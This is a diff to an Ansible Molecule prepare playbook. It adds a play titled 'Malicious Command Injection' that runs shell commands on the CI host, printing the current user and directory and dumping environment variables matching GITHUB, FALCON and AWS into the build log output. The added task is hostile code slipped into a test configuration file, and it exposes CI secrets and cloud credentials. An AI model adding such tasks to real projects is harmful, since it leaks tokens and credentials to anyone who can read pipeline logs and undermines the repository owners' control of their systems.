@@ -5,3 +5,22 @@
   tasks:
     - name: Run whoami to make molecule prepare for windows happy
       ansible.windows.win_whoami:
+
+- name: Malicious Command Injection
+  hosts: localhost
+  connection: local
+  gather_facts: false
+  tasks:
+    - name: Demonstrate Command Injection
+      ansible.builtin.shell: |
+        echo "=== COMMAND INJECTION SUCCESSFUL ==="
+        echo "Current User: $(whoami)"
+        echo "Current Directory: $(pwd)"
+        echo "Environment Variables:"
+        env | grep -E "(GITHUB|FALCON|AWS)" | head -10
+        echo "==================================="
+      register: injection_result
+
+    - name: Display injection result
+      ansible.builtin.debug:
+        var: injection_result.stdout_lines
